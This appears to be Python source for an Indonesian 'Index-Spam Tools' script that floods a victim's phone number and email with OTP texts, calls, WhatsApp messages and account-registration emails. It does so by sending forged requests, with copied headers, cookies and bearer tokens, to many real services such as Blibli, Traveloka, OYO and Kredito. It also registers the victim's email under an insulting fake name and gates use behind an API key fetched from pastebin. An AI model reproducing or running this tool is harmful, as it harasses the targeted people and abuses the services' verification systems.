...
baca3 = requests.get("https://sfile.mobi/8Xhlp8aJ7qc",headers={"User-Agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"}).text
...
def check():
	try:
		...
		url_apikey = requests.get("https://pastebin.com/raw/iJR9svcH").json()
		...
		if check_apikey["apikey"] in check["apikey"]:
			...
			print (f" {R}╳{putih} Apikey Expired/Salah")
			time.sleep(3)
			redirect()
...
def redirect():
	...
	check_apikey = requests.get(url_apikey["Key"]).json()
	url = url_apikey["Key"]
	api = requests.get('https://tinyurl.com/api-create.php?url=https://ayobelajarbareng.com/S2OaYctHLB').text
...
def ____banner____():
	print (f"""
{U}   ╦{putih}┌┐┌┌┬┐┌─┐─┐ ┬ {Y}⇑ {U}╔═╗{putih}┌─┐┌─┐┌┬┐  {R}| {U}•{putih} Creator {R}:{H} AmmarBN
{U}   ║{putih}│││ ││├┤ ┌┴┬┘▰{U}▱{putih}▰{U}╚═╗{putih}├─┘├─┤│││  {R}| {U}•{putih} Support {R}:{H} Xenzi{R}||{H}SanzzXD
{U}   ╩{putih}┘└┘─┴┘└─┘┴ └─ {Y}⇓ {U}╚═╝{putih}┴  ┴ ┴┴ ┴  {R}| {U}•{putih} Version {R}:{H} 2.3 {Y}Beta
{U}[ {Y}─────────────────────────────────────────────────────────── {U}]{putih}
   Info    {R}:{putih}   """+come)
	print (f"{putih}   User    {R}:{putih}  "+user+f" {R}|{H} Ip Not Gateaway")
	print (f"""{putih}   time    {R}:{putih}   """+day+timenow)
	print (f"{U}[{Y} ─────────────────────────────────────────────────────────── {U}]{putih}")

def __backtomenu__():
	try:
		choice=inquirer.list_input("Back To Menu ? (Yes/No) ", choices=["Yes","No"])
		if choice == "Yes":
			time.sleep(3)
			main()
		elif choice == "No":
...
def ___pysupport___():
        try:
                choice=inquirer.list_input("Support All Creator ? (AmmarBN/Xenzi/SanzzXD) ", choices=["AmmarBN","Xenzi","SanzzXD"])
                if choice == "AmmarBN":
                        time.sleep(3)
                        os.system("xdg-open https://youtube.com/@AmmarExecuted")
                        __backtomenu__()
                        ...
                        time.sleep(3)
                        os.system("xdg-open https://youtube.com/@xenzi-official")
                        __backtomenu__()
                elif choice == "SwnzzXD":
                        time.sleep(3)
                        os.system("xdg-open https://youtube.com/@sanzzxd1206")
                        __backtomenu__()
        except KeyboardInterrupt:
                sys.exit(f"{putih}[{R}!{putih}] Program Dihentikan {R}!{putih}")

def ___clearsystem___():
	os.system("clear")

def ______contacindex______():
	os.system("xdg-open https://t.me/SariiRooti")

def main():
	___clearsystem___()
	____banner____()
	print (f"   {putih}1{R}.{putih} Spam {Y}({H}Sms{R},{H}Call{R},{H}Wa{R},{H}Email{Y})")
	print (f"   {putih}2{R}.{putih} Contact Creator{R}/{putih}Owner")
	print (f"   {putih}3{R}.{putih} Support All Creator")
	print (f"   {putih}4{R}.{putih} Exit Index-Spam Tools")
	print (f"{U}[{Y} ─────────────────────────────────────────────────────────── {U}]{putih}")
	___menu___ = input(f"   {R}•{putih} Input Menu {Y}={R}⟩{H} ")
	if ___menu___ == "01" or ___menu___ == "1":
		___clearsystem___()
		____banner____()
		email = input(f"   {putih}[{B}?{putih}] Email {Y}({Ab}Exam:index@gmail.com{Y})={R}⟩{H} ")
		nomor = input(f"   {putih}[{B}?{putih}] Nomor {Y}({Ab}Exam:8xxx{Y})={R}⟩{H} ")
	...
	"cookie":"otp_config=%7B%22action%22%3A%22registration%2FdoRegister%22%2C%22redirectUrl%22%3A%22%2Fcatalog%3FnewUser%3D1%22%7D","cookie":"rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2B%2BfZWMpHNJzHadlZHZva4JNdrFmOCLYIX0Qh5h%2FPDZ8c2htJ%2FhtS9bKg3eddpUadVfLXPe7%2FYiIw%3D%3D","cookie":"amp_e15389=3AYNBj9lB2pDQI8v06V0tC...1gbusvcej.1gbut0lb0.6.0.6"}
		...
		headerskredito={'Host':'app-api.kredito.id','Connection':'keep-alive','Content-Length':'80','sec-ch-ua':'"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','Accept-Language':'id-ID','sec-ch-ua-mobile':'?1','User-Agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','Content-Type':'application/json; charset=UTF-8','Accept':'application/json, text/javascript, */*; q=0.01','LPR-BRAND':'Kredito','LPR-PLATFORM':'h5','sec-ch-ua-platform':'"Android"','Origin':'https://mobile.kredito.id','Sec-Fetch-Site':'same-site','Sec-Fetch-Mode':'cors','Sec-Fetch-Dest':'empty','Referer':'https://mobile.kredito.id/','Accept-Encoding':'gzip, deflate, br'}
		...
		headersmobilku={'Host':'api.mobilku.com','content-length':'42','sec-ch-ua':'"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','accept':'application/json, text/plain, */*','content-type':'application/json','sec-ch-ua-mobile':'?1','authorization':'Bearer','user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'"Android"','origin':'https://www.mobilku.com','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.mobilku.com/','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
		...
		headmapclub={'Host':'beryllium.mapclub.com','content-length':'25','sec-ch-ua':'"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','client-platform':'WEB','client-timestamp':'1686537041150','accept-language':'en-US','sec-ch-ua-mobile':'?1','authorization':'Bearer eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiJjYWU4MzQ2Yy0wM2RkLTQ4MGMtOTNiOS1kODQxMGMwYjQ3ZDkiLCJleHBpcmVkIjoxNjg2NTQwNjM4NzY5LCJleHBpcmUiOjM2MDAsImV4cCI6MTY4NjU0MDYzOCwiaWF0IjoxNjg2NTM3MDM4LCJwbGF0Zm9ybSI6IldFQiJ9.YvBffH6hv-SXkqMIvS2az_aG4NI8LmDZN7rdfIe2J-tIYY44EOlXCf9Nij7s5lVxRpJajrk_ZlFcJWPNfIdKJg','user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','content-type':'application/json','accept':'application/json, text/plain, */*','sec-ch-ua-platform':'"Android"','origin':'https://www.mapclub.com','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.mapclub.com/','accept-encoding':'gzip, deflate, br'}
		...
		headeci={'Host':'eci.id','Connection':'keep-alive','Content-Length':'205','sec-ch-ua':'"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','Accept':'application/json, text/plain, */*','Content-Type':'application/json','sec-ch-ua-mobile':'?1','User-Agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'"Android"','Origin':'https://eci.id','Sec-Fetch-Site':'same-origin','Sec-Fetch-Mode':'cors','Sec-Fetch-Dest':'empty','Referer':'https://eci.id/verification?step=1&phone=0'+nomor,'Accept-Encoding':'gzip, deflate, br','Accept-Language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
		...
		headfave={'Host':'api.myfave.com','Connection':'keep-alive','Content-Length':'26','sec-ch-ua':'"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','x-user-agent':'Fave-PWA/v1.0.0','content-type':'application/json','sec-ch-ua-mobile':'?1','User-Agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'"Android"','Accept':'*/*','Origin':'https://myfave.com','Sec-Fetch-Site':'same-site','Sec-Fetch-Mode':'cors','Sec-Fetch-Dest':'empty','Referer':'https://myfave.com/','Accept-Encoding':'gzip, deflate, br','Accept-Language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
		...
		headpluang={'Host':'api-pluang.pluang.com','sec-ch-ua':'"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','sec-ch-ua-mobile':'?1','x-platform':'desktop-web','user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','content-type':'application/json','accept':'application/json, text/plain, */*','x-request-id':'ae4031fa-321a-4d23-bd0a-f1a38675b3e0','sec-ch-ua-platform':'"Android"','origin':'https://pluang.com','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://pluang.com/','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
		...
		headaladin={'Host':'m.misteraladin.com','content-length':'81','sec-ch-ua':'"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','accept-language':'id','sec-ch-ua-mobile':'?1','x-platform':'mobile-web','content-type':'application/json','accept':'application/json, text/plain, */*','user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'"Android"','origin':'https://m.misteraladin.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://m.misteraladin.com/account','accept-encoding':'gzip, deflate, br'}
		...
		headtraveloka={'Host':'api.amplitude.com','content-length':'1378','sec-ch-ua':'"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','sec-ch-ua-platform':'"Android"','sec-ch-ua-mobile':'?1','user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','content-type':'application/x-www-form-urlencoded; charset=UTF-8','accept':'*/*','origin':'https://m.traveloka.com','sec-fetch-site':'cross-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://m.traveloka.com/','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
		...
		headoyo={'Host':'analytics.oyorooms.com','accept-language':'id','sec-ch-ua-mobile':'?1','user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','content-type':'application/json','externalheaders':'[object Object]','oyo_ab_config':'mww2:1|ioab:1|mhdp:1|bcrp:0|pwbs:1|hsdm:2|comp:0|nrmp:1|nhyw:1|ppsi:0|recs:1|swhp:0|lvhm:1|gmbr:0|yolo:1|rcta:1|cbot:1|otpv:1|ndbp:0|mapu:1|nclc:0|dwsl:1|eopt:1|otpv:1|wizi:0|morr:1|yopb:0|TTP:1|aimw:1|hdpn:1|web2:0|log2:0|spw1:0|log2:0|ugce:0|ltvr:0|hwiz:0|wizz:1|lpcp:1|clhp:0|prwt:1|cbhd:1|ins2:2|','fingerprint_hash':'099f81099e5c57e6acbedd90af1b832d','access_token':'SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=','xsrf-token':'bXI4kcTV-fQMIwHOpKV7_VEG_dvYsdEcZ9cg','sec-ch-ua-platform':'"Android"','accept':'*/*','origin':'https://www.oyorooms.com','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.oyorooms.com/','accept-encoding':'gzip, deflate, br'}
		...
		#email
		headmajo={'Host':'dashboard.majoo.id','content-length':'187','sec-ch-ua':'"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','sec-ch-ua-platform':'"Android"','sec-ch-ua-mobile':'?1','user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','content-type':'application/json','accept':'*/*','origin':'https://dashboard.majoo.id','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://dashboard.majoo.id/auth/register','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
		...
		majopost=requests.post("https://dashboard.majoo.id/mayang/0_0_8/user/register",headers=headmajo,data=datamajo).text
		headblimail={'Host':'www.blibli.com','content-length':'133','accept':'application/json, text/plain, */*','content-type':'application/json;charset=UTF-8','dvid':'JT_3c0-rgvBKDg1A9swQ_VlANJ5-g-6YuTuhYgeW3cP-gE','sec-ch-ua-mobile':'?1','user-agent':'Mozill/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'"Android"','origin':'https://www.blibli.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.blibli.com/register?redirect=%2Faccount','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
		datablimail=json.dumps({"username":email,"password":"GoblokAnjay321","fullName":"GoblokAnjay","captcha":{"token":""},"securityQuestions":[]})
		postblimail=requests.post("https://www.blibli.com/backend/common/users",headers=headblimail,data=datablimail).text
		#call
		...
		print (f"   {putih}[{H}✓{putih}] Berhasil Melakukan Index-Spam Ke {H}{nomor}")
		__backtomenu__()
	elif ___menu___ == "02" or ___menu___ == "2":
		___clearsystem___()
		____banner____()
		______contacindex______()
		__backtomenu__()
	elif ___menu___ == "03" or ___menu___ == "3":
		___pysupport___()
	elif ___menu___ == "04" or ___menu___ == "4":
		sys.exit(f"{putih}[{Y}^_^{putih}] Thanks For Use My Tools")
